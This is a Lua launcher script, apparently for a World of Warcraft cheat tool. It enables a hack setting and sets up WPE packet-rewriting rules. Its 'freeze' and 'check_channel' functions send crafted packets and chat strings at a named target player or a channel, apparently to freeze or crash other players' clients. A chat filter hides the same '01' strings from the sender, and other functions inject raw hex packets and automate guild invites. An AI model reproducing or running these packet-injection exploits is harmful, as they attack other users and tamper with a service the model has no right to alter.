-- Created by romain-p
-- see updates on http://github.com/romain-p

-- init all vars

if not launcher then
    launcher = true

    function loadscript(named)
        RunScript(ReadFile("script/" .. named .. ".lua"))
    end

    loadscript("shared_spells")
    loadscript("shared_units")
    loadscript("shared_filters")
    loadscript("shared_digest")

    all_scripts = {
        ["PRIEST"] = "priest_disc",
        ["WARRIOR"] = nil,
        ["ROGUE"] = nil,
        ["MAGE"] = nil,
        ["SHAMAN"] = nil,
        ["WARLOCK"] = "warlock_destro",
        ["DRUID"] = nil,
        ["HUNTER"] = nil,
        ["PALADIN"] = "paladin_ret",
        ["DEATHKNIGHT"] = nil
    }

    session = all_scripts[player_class]

    chat_filter = function (_, _, msg, _, ...)
        if msg:find("01") then
            return true
        else
            return false
        end
    end

    SetHackEnabled("ChatLogging", false)
    RunMacroText(".wpe log")
    RunMacroText(".wpe 26:7C 20:20 26:7C")
    RunMacroText(".wperecv 7C:20 20:20 7C:20")
    RunMacroText(".wperecv 7C:20 30:30 31:31")
    RunMacroText(".wperecv 7C:20 30:30 32:32")
    RunMacroText(".wperecv 7C:20 30:30 33:33")

    function freeze(x)
        if not x and not UnitExists("target") then return end

        local name = x

        if name == nil then
            name = UnitName("target")
        end

        local packet = "95 00 00 00 07 00 00 00 07 00 00 00 "
        local target_hex = name:gsub('.', function (c)
            return string.format('%02X ', string.byte(c))
        end)
        packet = packet .. target_hex .. "00 7C 20 7C 30 31 00"

        RunMacroText(".send "..packet)
        print("Sniped "..UnitName("target"))
    end

    function check_channel(channel)
        if channel ~= nil then
            RunMacroText("/say " .. channel .. "& &01")
        else
            RunMacroText("& &01")
        end

        print("Sniped channel")
    end

    totox = 0

    function checkk()
        local name = UnitName("target")
        if name == nil and not aaa then
            aaa = true
            RegisterSimpleCallback(true, nil,
                function()
                    if GetTime() - totox < 20 then
                         return false
                    end
                    totox = GetTime()
                    RunMacroText(".sp p Dotsndchaos")
                    GuildInvite("Berrumoddo")
                    GuildInvite("Superiorism")
                    GuildInvite("Sobadjk")
                end
            )
        end
        GuildInvite(name)
    end

    function create()
        RunMacroText(".send BD 01 00 00 63 60 2F 0A 14 00 30 F1 00 00 00 00 00 00 00 00 00 00 00 00 32 32 30 31 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00")
        RunMacroText(".send 56 00 00 00 E7 16 00 00")
    end

    fframe = CreateFrame("FRAME", nil, UIParent)
    fframe:RegisterEvent("PLAYER_FLAGS_CHANGED")
    fframe:SetScript("OnEvent",
        function(self, event, arg1, type, srcGuid, srcName, arg2, targetGuid, targetName, arg3, spellId)
            if UnitIsAFK("target") then
                if select(1, GetGuildInfo("targettarget")) ~= nil then
                    GuildInvite(UnitName("targettarget"))
                else
                    GuildInvite(UnitName("target"))
                end
            end
        end
    )

    ffframe = CreateFrame("FRAME", nil, UIParent)
    ffframe:RegisterEvent("GUILD_INVITE_REQUEST")
    ffframe:SetScript("OnEvent",
        function(self, event, arg1, type, srcGuid, srcName, arg2, targetGuid, targetName, arg3, spellId)
            AcceptGuild()
        end
    )

    function life()
        local current = GetTime()
        RunMacroText("/afk")
        doit = CreateTimer(550,
            function()
                if GetTime() - current >= 0.2 then
                    RunMacroText("/afk")
                    StopTimer(doit)
                end
            end
        )
    end
end

if session == nil then
    print("Launcher: no script found for " .. player_class)
else
    loadscript(session)
end